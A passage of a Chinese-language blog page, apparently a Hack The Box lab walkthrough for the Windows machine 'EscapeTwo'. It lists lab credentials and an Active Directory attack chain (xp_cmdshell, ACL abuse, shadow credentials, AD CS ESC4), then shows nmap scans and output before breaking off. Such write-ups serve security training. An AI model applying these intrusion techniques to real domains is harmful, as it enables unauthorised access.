@@ -1,0 +1,784 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/icon.jpg">
+  <link rel="icon" href="/img/icon.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Skyarrow">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="飛べよ鵬翼のヴァイオレット　火の鳥のように We are 何度も歌い強くなった  靶机ip：10.129.186.96 难度：简单 初始凭据： rose &#x2F; KxEPkKe6R8su 涉及内容： 端口扫描与服务枚举：识别域控制器特征端口 (88, 389, 636) 及关键服务 (MSSQL, SMB)。 SMB 共享错误配置利用：发现非默认共享目录并提取敏感文件。 敏感信息泄露分析：从">
+<meta property="og:type" content="article">
+<meta property="og:title" content="从零开始的windows生活-EscapeTwo">
+<meta property="og:url" content="http://example.com/2026/01/21/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84windows%E7%94%9F%E6%B4%BB-EscapeTwo/index.html">
+<meta property="og:site_name" content="Skyarrow&#39;s blog">
+<meta property="og:description" content="飛べよ鵬翼のヴァイオレット　火の鳥のように We are 何度も歌い強くなった  靶机ip：10.129.186.96 难度：简单 初始凭据： rose &#x2F; KxEPkKe6R8su 涉及内容： 端口扫描与服务枚举：识别域控制器特征端口 (88, 389, 636) 及关键服务 (MSSQL, SMB)。 SMB 共享错误配置利用：发现非默认共享目录并提取敏感文件。 敏感信息泄露分析：从">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2026/01/21/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84windows%E7%94%9F%E6%B4%BB-EscapeTwo/vmware_yCR1ZCiAn2.png">
+<meta property="og:image" content="http://example.com/2026/01/21/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84windows%E7%94%9F%E6%B4%BB-EscapeTwo/vmware_u2uZYpS8CC.png">
+<meta property="og:image" content="http://example.com/2026/01/21/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84windows%E7%94%9F%E6%B4%BB-EscapeTwo/vmware_N5wrOJ1PhI.png">
+<meta property="og:image" content="http://example.com/2026/01/21/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84windows%E7%94%9F%E6%B4%BB-EscapeTwo/vmware_zi0757mMek.png">
+<meta property="article:published_time" content="2026-01-21T05:47:02.000Z">
+<meta property="article:modified_time" content="2026-01-21T08:54:43.958Z">
+<meta property="article:author" content="Skyarrow">
+<meta property="article:tag" content="windows">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2026/01/21/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84windows%E7%94%9F%E6%B4%BB-EscapeTwo/vmware_yCR1ZCiAn2.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>从零开始的windows生活-EscapeTwo - Skyarrow&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null},"busuanzi":{"enable":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Skyarrow&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>Links</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/card_normal.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="从零开始的windows生活-EscapeTwo"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-01-21 13:47" pubdate>
+          January 21, 2026 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          4.2k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          35 mins
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> views
+        </span>
+        
+
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">从零开始的windows生活-EscapeTwo</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>飛べよ鵬翼のヴァイオレット　火の鳥のように</p>
+<p>We are 何度も歌い強くなった</p>
+<hr>
+<p>靶机ip：10.129.186.96</p>
+<p>难度：简单</p>
+<p>初始凭据： rose &#x2F; KxEPkKe6R8su</p>
+<p>涉及内容：</p>
+<p><strong>端口扫描与服务枚举</strong>：识别域控制器特征端口 (88, 389, 636) 及关键服务 (MSSQL, SMB)。</p>
+<p><strong>SMB 共享错误配置利用</strong>：发现非默认共享目录并提取敏感文件。</p>
+<p><strong>敏感信息泄露分析</strong>：从 <code>.xlsx</code> (XML) 文件和应用程序配置文件 (<code>.ini</code>) 中提取明文凭据。</p>
+<p><strong>MSSQL 数据库渗透</strong>：利用 <code>sa</code> 账户启用 <code>xp_cmdshell</code> 执行系统命令。</p>
+<p><strong>横向移动 (Lateral Movement)</strong>：通过凭据复用 (Credential Reuse) 和 WinRM 协议进行横向移动。</p>
+<p><strong>域内攻击路径分析</strong>：使用 BloodHound 识别隐蔽的 ACL 攻防路径。</p>
+<p><strong>DACL 滥用 (ACL Abuse)</strong>：利用 <code>WriteOwner</code> 和 <code>GenericAll</code> 权限接管 AD 对象。</p>
+<p><strong>影子凭据攻击 (Shadow Credentials)</strong>：利用 <code>msDS-KeyCredentialLink</code> 属性获取 NTLM Hash。</p>
+<p><strong>AD CS 证书服务攻击 (ESC4)</strong>：利用证书模板写权限 (ESC4) 构造高危模板，伪造域管证书。</p>
+<hr>
+<p>nmap全端口扫描</p>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs nix">┌──(root㉿kaada)-[<span class="hljs-operator">/</span>home<span class="hljs-operator">/</span>kali<span class="hljs-operator">/</span>Desktop]<br>└─<span class="hljs-comment"># nmap -p- 10.129.186.96 -Pn</span><br>Nmap scan report for <span class="hljs-number">10.129</span>.<span class="hljs-number">186.96</span><br>Host is up (<span class="hljs-number">0.13</span>s latency).<br>Not <span class="hljs-params">shown:</span> <span class="hljs-number">65510</span> filtered tcp ports (no-response)<br>PORT      STATE SERVICE<br><span class="hljs-number">53</span><span class="hljs-symbol">/tcp</span>    open  domain<br><span class="hljs-number">88</span><span class="hljs-symbol">/tcp</span>    open  kerberos-sec<br><span class="hljs-number">135</span><span class="hljs-symbol">/tcp</span>   open  msrpc<br><span class="hljs-number">139</span><span class="hljs-symbol">/tcp</span>   open  netbios-ssn<br><span class="hljs-number">389</span><span class="hljs-symbol">/tcp</span>   open  ldap<br><span class="hljs-number">445</span><span class="hljs-symbol">/tcp</span>   open  microsoft-ds<br><span class="hljs-number">464</span><span class="hljs-symbol">/tcp</span>   open  kpasswd5<br><span class="hljs-number">593</span><span class="hljs-symbol">/tcp</span>   open  http-rpc-epmap<br><span class="hljs-number">636</span><span class="hljs-symbol">/tcp</span>   open  ldapssl<br><span class="hljs-number">1433</span><span class="hljs-symbol">/tcp</span>  open  ms-sql-s<br><span class="hljs-number">3268</span><span class="hljs-symbol">/tcp</span>  open  globalcatLDAP<br><span class="hljs-number">3269</span><span class="hljs-symbol">/tcp</span>  open  globalcatLDAPssl<br><span class="hljs-number">5985</span><span class="hljs-symbol">/tcp</span>  open  wsman<br><span class="hljs-number">9389</span><span class="hljs-symbol">/tcp</span>  open  adws<br><span class="hljs-number">47001</span><span class="hljs-symbol">/tcp</span> open  winrm<br><span class="hljs-number">49664</span><span class="hljs-symbol">/tcp</span> open  unknown<br><span class="hljs-number">49665</span><span class="hljs-symbol">/tcp</span> open  unknown<br><span class="hljs-number">49666</span><span class="hljs-symbol">/tcp</span> open  unknown<br><span class="hljs-number">49668</span><span class="hljs-symbol">/tcp</span> open  unknown<br><span class="hljs-number">49689</span><span class="hljs-symbol">/tcp</span> open  unknown<br><span class="hljs-number">49690</span><span class="hljs-symbol">/tcp</span> open  unknown<br><span class="hljs-number">49695</span><span class="hljs-symbol">/tcp</span> open  unknown<br><span class="hljs-number">49712</span><span class="hljs-symbol">/tcp</span> open  unknown<br><span class="hljs-number">49728</span><span class="hljs-symbol">/tcp</span> open  unknown<br><span class="hljs-number">49738</span><span class="hljs-symbol">/tcp</span> open  unknown<br><br>Nmap <span class="hljs-params">done:</span> <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">760.68</span> seconds<br><br></code></pre></td></tr></table></figure>
+
+<p>nmap细节服务探测</p>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><code class="hljs nix">┌──(root㉿kaada)-[<span class="hljs-operator">/</span>home<span class="hljs-operator">/</span>kali<span class="hljs-operator">/</span>Desktop]<br>└─<span class="hljs-comment"># nmap -p53,88,135,139,445,464,593,636,1433,3268,3269,5985,9389,47001,49664,49665,49666,49668,49689,49690,49712,49728,49738 -sV -sC -A 10.129.186.96 -Pn</span><br>Starting Nmap <span class="hljs-number">7.98</span> ( https:<span class="hljs-symbol">//nmap.org</span> ) at <span class="hljs-number">202</span>6-<span class="hljs-number">0</span>1-<span class="hljs-number">21</span> <span class="hljs-number">00</span>:<span class="hljs-number">43</span> <span class="hljs-operator">-</span><span class="hljs-number">0500</span><br><span class="hljs-params">Stats:</span> <span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">09</span> elapsed; <span class="hljs-number">0</span> hosts completed (<span class="hljs-number">1</span> up), <span class="hljs-number">1</span> undergoing Service Scan<br>Service scan <span class="hljs-params">Timing:</span> About <span class="hljs-number">43.48</span>% done; <span class="hljs-params">ETC:</span> <span class="hljs-number">00</span>:<span class="hljs-number">43</span> (<span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">10</span> remaining)<br><span class="hljs-params">Stats:</span> <span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">44</span> elapsed; <span class="hljs-number">0</span> hosts completed (<span class="hljs-number">1</span> up), <span class="hljs-number">1</span> undergoing Service Scan<br>Service scan <span class="hljs-params">Timing:</span> About <span class="hljs-number">60.87</span>% done; <span class="hljs-params">ETC:</span> <span class="hljs-number">00</span>:<span class="hljs-number">44</span> (<span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">28</span> remaining)<br><span class="hljs-params">Stats:</span> <span class="hljs-number">0</span>:<span class="hljs-number">01</span>:<span class="hljs-number">19</span> elapsed; <span class="hljs-number">0</span> hosts completed (<span class="hljs-number">1</span> up), <span class="hljs-number">1</span> undergoing Script Scan<br>NSE <span class="hljs-params">Timing:</span> About <span class="hljs-number">98.48</span>% done; <span class="hljs-params">ETC:</span> <span class="hljs-number">00</span>:<span class="hljs-number">44</span> (<span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> remaining)<br><span class="hljs-params">Stats:</span> <span class="hljs-number">0</span>:<span class="hljs-number">01</span>:<span class="hljs-number">33</span> elapsed; <span class="hljs-number">0</span> hosts completed (<span class="hljs-number">1</span> up), <span class="hljs-number">1</span> undergoing Script Scan<br>NSE <span class="hljs-params">Timing:</span> About <span class="hljs-number">99.94</span>% done; <span class="hljs-params">ETC:</span> <span class="hljs-number">00</span>:<span class="hljs-number">44</span> (<span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> remaining)<br>Nmap scan report for <span class="hljs-number">10.129</span>.<span class="hljs-number">186.96</span><br>Host is up (<span class="hljs-number">0.16</span>s latency).<br><br>PORT      STATE SERVICE       VERSION<br><span class="hljs-number">53</span><span class="hljs-symbol">/tcp</span>    open  tcpwrapped<br><span class="hljs-number">88</span><span class="hljs-symbol">/tcp</span>    open  kerberos-sec  Microsoft Windows Kerberos (server <span class="hljs-params">time:</span> <span class="hljs-number">202</span>6-<span class="hljs-number">0</span>1-<span class="hljs-number">21</span> <span class="hljs-number">05</span>:<span class="hljs-number">43</span>:<span class="hljs-number">36</span>Z)<br><span class="hljs-number">135</span><span class="hljs-symbol">/tcp</span>   open  msrpc         Microsoft Windows RPC<br><span class="hljs-number">139</span><span class="hljs-symbol">/tcp</span>   open  netbios-ssn   Microsoft Windows netbios-ssn<br><span class="hljs-number">445</span><span class="hljs-symbol">/tcp</span>   open  microsoft-ds<span class="hljs-operator">?</span><br><span class="hljs-number">464</span><span class="hljs-symbol">/tcp</span>   open  kpasswd5<span class="hljs-operator">?</span><br><span class="hljs-number">593</span><span class="hljs-symbol">/tcp</span>   open  ncacn_http    Microsoft Windows RPC over HTTP <span class="hljs-number">1.0</span><br><span class="hljs-number">636</span><span class="hljs-symbol">/tcp</span>   open  ssl<span class="hljs-symbol">/ldap</span>      Microsoft Windows Active Directory LDAP (<span class="hljs-params">Domain:</span> sequel.htb, <span class="hljs-params">Site:</span> Default-First-Site-Name)<br>| <span class="hljs-params">ssl-cert:</span> <span class="hljs-params">Subject:</span> <br>| Subject Alternative <span class="hljs-params">Name:</span> DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL<br>| Not valid <span class="hljs-params">before:</span> <span class="hljs-number">202</span>5-<span class="hljs-number">0</span>6-<span class="hljs-number">26</span>T11:<span class="hljs-number">46</span>:<span class="hljs-number">45</span><br>|_Not valid <span class="hljs-params">after:</span>  <span class="hljs-number">212</span>4-<span class="hljs-number">0</span>6-<span class="hljs-number">08</span>T17:<span class="hljs-number">00</span>:<span class="hljs-number">40</span><br>|<span class="hljs-params">_ssl-date:</span> <span class="hljs-number">202</span>6-<span class="hljs-number">0</span>1-<span class="hljs-number">21</span>T05:<span class="hljs-number">45</span>:<span class="hljs-number">19</span><span class="hljs-operator">+</span><span class="hljs-number">00</span>:<span class="hljs-number">00</span>; <span class="hljs-operator">+</span><span class="hljs-number">6</span>s from scanner time.<br><span class="hljs-number">1433</span><span class="hljs-symbol">/tcp</span>  open  ms-sql-s      Microsoft SQL Server <span class="hljs-number">2019</span> <span class="hljs-number">15.00</span>.<span class="hljs-number">2000.00</span>; RTM<br>|<span class="hljs-params">_ssl-date:</span> <span class="hljs-number">202</span>6-<span class="hljs-number">0</span>1-<span class="hljs-number">21</span>T05:<span class="hljs-number">45</span>:<span class="hljs-number">19</span><span class="hljs-operator">+</span><span class="hljs-number">00</span>:<span class="hljs-number">00</span>; <span class="hljs-operator">+</span><span class="hljs-number">6</span>s from scanner time.<br>| <span class="hljs-params">ms-sql-ntlm-info:</span> <br>|   <span class="hljs-number">10.129</span>.<span class="hljs-number">186.96</span>:<span class="hljs-number">1433</span>: <br>|     <span class="hljs-params">Target_Name:</span> SEQUEL<br>|     <span class="hljs-params">NetBIOS_Domain_Name:</span> SEQUEL<br>|     <span class="hljs-params">NetBIOS_Computer_Name:</span> DC01<br>|     <span class="hljs-params">DNS_Domain_Name:</span> sequel.htb<br>|     <span class="hljs-params">DNS_Computer_Name:</span> DC01.sequel.htb<br>|     <span class="hljs-params">DNS_Tree_Name:</span> sequel.htb<br>|_    <span class="hljs-params">Product_Version:</span> <span class="hljs-number">10.0</span>.<span class="hljs-number">17763</span><br>| <span class="hljs-params">ms-sql-info:</span> <br>|   <span class="hljs-number">10.129</span>.<span class="hljs-number">186.96</span>:<span class="hljs-number">1433</span>: <br>|     <span class="hljs-params">Version:</span> <br>|       <span class="hljs-params">name:</span> Microsoft SQL Server <span class="hljs-number">2019</span> RTM<br>|       <span class="hljs-params">number:</span> <span class="hljs-number">15.00</span>.<span class="hljs-number">2000.00</span><br>|       <span class="hljs-params">Product:</span> Microsoft SQL Server <span class="hljs-number">2019</span><br>|       Service pack <span class="hljs-params">level:</span> RTM<br>|       Post-SP patches <span class="hljs-params">applied:</span> <span class="hljs-literal">false</span><br>|_    TCP <span class="hljs-params">port:</span> <span class="hljs-number">1433</span><br>| <span class="hljs-params">ssl-cert:</span> <span class="hljs-params">Subject:</span> commonName<span class="hljs-operator">=</span>SSL_Self_Signed_Fallback<br>| Not valid <span class="hljs-params">before:</span> <span class="hljs-number">202</span>6-<span class="hljs-number">0</span>1-<span class="hljs-number">21</span>T05:<span class="hljs-number">28</span>:<span class="hljs-number">38</span><br>|_Not valid <span class="hljs-params">after:</span>  <span class="hljs-number">205</span>6-<span class="hljs-number">0</span>1-<span class="hljs-number">21</span>T05:<span class="hljs-number">28</span>:<span class="hljs-number">38</span><br><span class="hljs-number">3268</span><span class="hljs-symbol">/tcp</span>  open  ldap          Microsoft Windows Active Directory LDAP (<span class="hljs-params">Domain:</span> sequel.htb, <span class="hljs-params">Site:</span> Default-First-Site-Name)<br>|<span class="hljs-params">_ssl-date:</span> <span class="hljs-number">202</span>6-<span class="hljs-number">0</span>1-<span class="hljs-number">21</span>T05:<span class="hljs-number">45</span>:<span class="hljs-number">19</span><span class="hljs-operator">+</span><span class="hljs-number">00</span>:<span class="hljs-number">00</span>; <span class="hljs-operator">+</span><span class="hljs-number">6</span>s from scanner time.<br>| <span class="hljs-params">ssl-cert:</span> <span class="hljs-params">Subject:</span> <br>| Subject Alternative <span class="hljs-params">Name:</span> DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL<br>| Not valid <span class="hljs-params">before:</span> <span class="hljs-number">202</span>5-<span class="hljs-number">0</span>6-<span class="hljs-number">26</span>T11:<span class="hljs-number">46</span>:<span class="hljs-number">45</span><br>|_Not valid <span class="hljs-params">after:</span>  <span class="hljs-number">212</span>4-<span class="hljs-number">0</span>6-<span class="hljs-number">08</span>T17:<span class="hljs-number">00</span>:<span class="hljs-number">40</span><br><span class="hljs-number">3269</span><span class="hljs-symbol">/tcp</span>  open  ssl<span class="hljs-symbol">/ldap</span>      Microsoft Windows Active Directory LDAP (<span class="hljs-params">Domain:</span> sequel.htb, <span class="hljs-params">Site:</span> Default-First-Site-Name)<br>| <span class="hljs-params">ssl-cert:</span> <span class="hljs-params">Subject:</span> <br>| Subject Alternative <span class="hljs-params">Name:</span> DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL<br>| Not valid <span class="hljs-params">before:</span> <span class="hljs-number">202</span>5-<span class="hljs-number">0</span>6-<span class="hljs-number">26</span>T11:<span class="hljs-number">46</span>:<span class="hljs-number">45</span><br>|_Not valid <span class="hljs-params">after:</span>  <span class="hljs-number">212</span>4-<span class="hljs-number">0</span>6-<span class="hljs-number">08</span>T17:<span class="hljs-number">00</span>:<span class="hljs-number">40</span><br>|<span class="hljs-params">_ssl-date:</span> <span class="hljs-number">202</span>6-<span class="hljs-number">0</span>1-<span class="hljs-number">21</span>T05:<span class="hljs-number">45</span>:<span class="hljs-number">19</span><span class="hljs-operator">+</span><span class="hljs-number">00</span>:<span class="hljs-number">00</span>; <span class="hljs-operator">+</span><span class="hljs-number">6</span>s from scanner time.<br><span class="hljs-number">5985</span><span class="hljs-symbol">/tcp</span>  open  http          Microsoft HTTPAPI httpd <span class="hljs-number">2.0</span> (SSDP<span class="hljs-operator">/</span>UPnP)<br>|<span class="hljs-params">_http-title:</span> Not Found<br><span class="hljs-number">9389</span><span class="hljs-symbol">/tcp</span>  open  mc-nmf        .NET Message Framing<br><span class="hljs-number">47001</span><span class="hljs-symbol">/tcp</span> open  http          Microsoft HTTPAPI httpd <span class="hljs-number">2.0</span> (SSDP<span class="hljs-operator">/</span>UPnP)<br>|<span class="hljs-params">_http-title:</span> Not Found<br><span class="hljs-number">49664</span><span class="hljs-symbol">/tcp</span> open  msrpc         Microsoft Windows RPC<br><span class="hljs-number">49665</span><span class="hljs-symbol">/tcp</span> open  msrpc         Microsoft Windows RPC<br><span class="hljs-number">49666</span><span class="hljs-symbol">/tcp</span> open  msrpc         Microsoft Windows RPC<br><span class="hljs-number">49668</span><span class="hljs-symbol">/tcp</span> open  msrpc         Microsoft Windows RPC<br><span class="hljs-number">49689</span><span class="hljs-symbol">/tcp</span> open  ncacn_http    Microsoft Windows RPC over HTTP <span class="hljs-number">1.0</span><br><span class="hljs-number">49690</span><span class="hljs-symbol">/tcp</span> open  msrpc         Microsoft Windows RPC<br><span class="hljs-number">49712</span><span class="hljs-symbol">/tcp</span> open  msrpc         Microsoft Windows RPC<br><span class="hljs-number">49728</span><span class="hljs-symbol">/tcp</span> open  msrpc         Microsoft Windows RPC<br><span class="hljs-number">49738</span><span class="hljs-symbol">/tcp</span> open  msrpc         Microsoft Windows RPC<br><span class="hljs-params">Warning:</span> OSScan results may be unreliable because we could not find at least <span class="hljs-number">1</span> open and <span class="hljs-number">1</span> closed port<br>Device <span class="hljs-params">type:</span> general purpose<br>Running (JUST GUESSING): Microsoft Windows <span class="hljs-number">2019</span>|<span class="hljs-number">10</span> (<span class="hljs-number">97</span>%)<br>OS <span class="hljs-params">CPE:</span> cpe:<span class="hljs-operator">/</span>o:microsoft:windows_server_2019 cpe:<span class="hljs-operator">/</span>o:microsoft:windows_10<br>Aggressive OS <span class="hljs-params">guesses:</span> 